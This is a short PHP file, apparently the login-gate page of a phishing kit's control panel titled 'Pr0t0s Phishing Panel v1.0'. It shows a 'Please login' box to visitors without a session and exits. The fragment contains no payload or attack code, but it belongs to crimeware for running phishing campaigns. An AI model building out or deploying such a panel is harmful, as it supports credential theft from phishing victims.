
<?php
error_reporting(0);
	if(!$_SESSION['login']) {
		echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Pr0t0s Phishing Panel v1.0</title>
<link rel="shortcut icon" href="img/favicon/favicon.ico" type="image/x-icon">
<link rel="stylesheet" type="text/css" href="css/facebox.css" />
<link rel="stylesheet" type="text/css" href="css/style3.css"/>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" src="js/highcharts.js"></script>
<script language="javascript" src="js/facebox.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<div id="infobox" style="width:250px;border-color: Red;" ><img src="img/other/x.png" style="margin-bottom:-4px;" />&nbsp;Please <a href="login.php">login</a></div>
</body></html>';
		exit();
	}
?>